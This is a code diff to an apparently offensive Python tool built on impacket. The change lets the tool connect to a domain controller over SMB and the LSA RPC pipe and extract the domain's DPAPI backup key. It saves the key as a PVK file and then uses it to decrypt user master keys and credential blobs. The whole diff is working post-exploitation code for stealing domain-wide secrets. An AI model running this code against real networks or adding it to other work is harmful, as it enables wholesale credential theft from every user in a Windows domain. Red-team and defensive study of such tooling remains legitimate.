@@ -5,14 +5,17 @@ import sys
 import argparse
 from impacket.examples.utils import parse_target
 from impacket.smbconnection import SMBConnection
+from impacket.dcerpc.v5 import transport, lsad
 from impacket.ldap import ldap
+from impacket import crypto
+from impacket.uuid import bin_to_string
+from impacket.dpapi import CredHist, PVK_FILE_HDR, PREFERRED_BACKUP_KEY, PRIVATE_KEY_BLOB, privatekeyblob_to_pkcs1, MasterKeyFile, MasterKey, DomainKey, DPAPI_DOMAIN_RSA_MASTER_KEY, CredentialFile, DPAPI_BLOB, CREDENTIAL_BLOB
 import struct
 import binascii
 from binascii import unhexlify, hexlify
 import dns.resolver
 from impacket.examples.smbclient import MiniImpacketShell
 import traceback
-from impacket.dpapi import CredHist, PVK_FILE_HDR, PRIVATE_KEY_BLOB, privatekeyblob_to_pkcs1, MasterKeyFile, MasterKey, DomainKey, DPAPI_DOMAIN_RSA_MASTER_KEY, CredentialFile, DPAPI_BLOB, CREDENTIAL_BLOB
 from Cryptodome.Cipher import PKCS1_v1_5
 from datetime import datetime
 from impacket.ese import getUnixTime
@@ -305,13 +308,63 @@ def main():
 	
 
 
+	if options.pvk is None:
+		if options.debug is True:
+			print("Domain backup keys not given.\nTrying to extract...")
+		# get domain backup keys
+		try:
+			array_of_mkf_keys = []
+			connection = SMBConnection(address, address)
+			connection.login(username, password, domain, lmhash, nthash)
+			# create rpc pipe
+			rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:445[\pipe\lsarpc]')
+			rpctransport.set_smb_connection(connection)
+			dce = rpctransport.get_dce_rpc()
+			dce.connect()
+			# connection to LSA remotely through RPC
+			dce.bind(lsad.MSRPC_UUID_LSAD)
+			resp = lsad.hLsarOpenPolicy2(dce, lsad.POLICY_GET_PRIVATE_INFORMATION)
 
-	if options.pvk is not None:
+			# now retrieve backup key GUID : https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-bkrp/e8118398-d3da-45fc-827f-186f1c417b69
+			buffer = crypto.decryptSecret(connection.getSessionKey(), lsad.hLsarRetrievePrivateData(dce, resp['PolicyHandle'], "G$BCKUPKEY_PREFERRED"))
+			guid = bin_to_string(buffer)
+			name = "G$BCKUPKEY_{}".format(guid)
+			secret = crypto.decryptSecret(connection.getSessionKey(), lsad.hLsarRetrievePrivateData(dce, resp['PolicyHandle'], name))
+			backup_key = PREFERRED_BACKUP_KEY(secret)
+			pvk = backup_key['Data'][:backup_key['KeyLength']]
+
+			# see my PR on pypykatz to understand structure : https://github.com/skelsec/pypykatz/blob/master/pypykatz/dpapi/dpapi.py
+			header = PVK_FILE_HDR()
+			header['dwMagic'] = 0xb0b5f11e
+			header['dwVersion'] = 0
+			header['dwKeySpec'] = 1
+			header['dwEncryptType'] = 0
+			header['cbEncryptData'] = 0
+			header['cbPvk'] = backup_key['KeyLength']
+			key = header.getData() + pvk
+			open(directory + "/pvkfile.pvk", 'wb').write(key)
+		except:
+			print("Error : Can't extract domain backup keys.")
+			if options.debug is True or options.debugmax is True:
+				import traceback
+				traceback.print_exc()
+			sys.exit(1)
+
+
+
+
+
+	if options.pvk is not None or os.path.exists(directory+"/pvkfile.pvk"):
+		pvk_file = directory + "/pvkfile.pvk"
+		if options.pvk is not None:
+			pvk_file = options.pvk
+
 		# decrypt pvk file
 		if options.debug is True:
+			print("Domain backup keys found.")
 			print("Trying to decrypt PVK file...")
 		try:
-			pvkfile = open(options.pvk, 'rb').read()
+			pvkfile = open(pvk_file, 'rb').read()
 			key = PRIVATE_KEY_BLOB(pvkfile[len(PVK_FILE_HDR()):])
 			private = privatekeyblob_to_pkcs1(key)
 			cipher = PKCS1_v1_5.new(private)
@@ -344,7 +397,6 @@ def main():
 					if decryptedKey:
 						domain_master_key = DPAPI_DOMAIN_RSA_MASTER_KEY(decryptedKey)
 						key = domain_master_key['buffer'][:domain_master_key['cbMasterKey']]
-
 						array_of_mkf_keys.append(key)
 						if options.debugmax is True:
 							print("New mkf key decrypted : " + str(hexlify(key).decode('latin-1')) )
@@ -358,13 +410,16 @@ def main():
 				print(str( len(array_of_mkf_keys)) + " MKF keys have been decrypted !")
 		except:
 			print("Error occured while decrypting PVK file.")
-			if options.debugmax is True:
+			if options.debug is True:
 				import traceback
 				traceback.print_exc()
 			os._exit(1)
 	else:
-		print("Domain backup keys not given.\nBlobs will not be decrypted.")
-		os._exit(1)
+		print("Domain backup keys not found.")
+		if options.debug is True:
+			import traceback
+			traceback.print_exc()
+		os._exit(1)	
 
 
 	
